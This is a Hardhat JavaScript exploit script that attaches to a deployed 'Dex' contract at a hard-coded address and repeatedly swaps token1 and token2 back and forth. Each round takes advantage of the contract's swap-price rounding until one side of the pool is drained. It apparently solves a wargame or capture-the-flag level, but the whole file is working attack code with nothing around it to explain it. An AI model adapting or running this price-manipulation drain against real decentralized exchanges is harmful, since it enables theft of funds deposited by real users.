const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0xebE8D22CE2eDa000F1BF1E5116AccB180870215e";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Instance = await ethers.getContractFactory("Dex");
  const instance = Instance.attach(instanceAddress);

  // Attack

  const TOKEN1 = await instance.token1();
  const TOKEN2 = await instance.token2();

  let attackerBalanceT1,
    attackerBalanceT2,
    swapPrice,
    dexBalanceT1,
    dexBalanceT2,
    swapAmount,
    tx;

  tx = await instance.approve(instanceAddress, 100_000);
  await tx.wait();

  while (
    (await instance.balanceOf(TOKEN2, instanceAddress)).gt(0) &&
    (await instance.balanceOf(TOKEN1, instanceAddress)).gt(0)
  ) {
    // TOKEN1 -> TOKEN2 SWAP
    attackerBalanceT1 = await instance.balanceOf(TOKEN1, attacker.address);
    swapPrice = await instance.getSwapPrice(TOKEN1, TOKEN2, attackerBalanceT1);
    dexBalanceT1 = await instance.balanceOf(TOKEN1, instanceAddress);
    dexBalanceT2 = await instance.balanceOf(TOKEN2, instanceAddress);

    if (swapPrice.gt(dexBalanceT2)) {
      swapAmount = dexBalanceT1;
    } else {
      swapAmount = attackerBalanceT1;
    }

    tx = await instance.swap(TOKEN1, TOKEN2, swapAmount);
    await tx.wait();

    // TOKEN2 -> TOKEN1 SWAP
    attackerBalanceT2 = await instance.balanceOf(TOKEN2, attacker.address);
    swapPrice = await instance.getSwapPrice(TOKEN2, TOKEN1, attackerBalanceT2);
    dexBalanceT1 = await instance.balanceOf(TOKEN1, instanceAddress);
    dexBalanceT2 = await instance.balanceOf(TOKEN2, instanceAddress);

    if (swapPrice.gt(dexBalanceT1)) {
      swapAmount = dexBalanceT2;
    } else {
      swapAmount = attackerBalanceT2;
    }

    tx = await instance.swap(TOKEN2, TOKEN1, swapAmount);
    await tx.wait();
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
